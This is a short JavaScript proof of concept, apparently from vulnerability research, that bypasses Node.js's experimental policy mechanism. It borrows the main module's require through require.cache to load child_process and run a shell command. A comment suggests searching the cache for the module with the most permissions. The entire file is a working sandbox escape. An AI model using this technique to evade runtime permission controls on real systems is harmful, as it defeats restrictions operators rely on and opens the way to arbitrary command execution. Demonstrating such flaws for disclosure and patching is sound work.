/* 
"Module Moocher"

nvm use 20.0.0
node --experimental-policy=policy.json main.js
*/

const main_module_ref = Object.values(require.cache)[0]; // we could loop to fins the module with permissions we want. 
const child_process = main_module_ref.require("node:child_process");
console.log(child_process.execSync("ls -la").toString());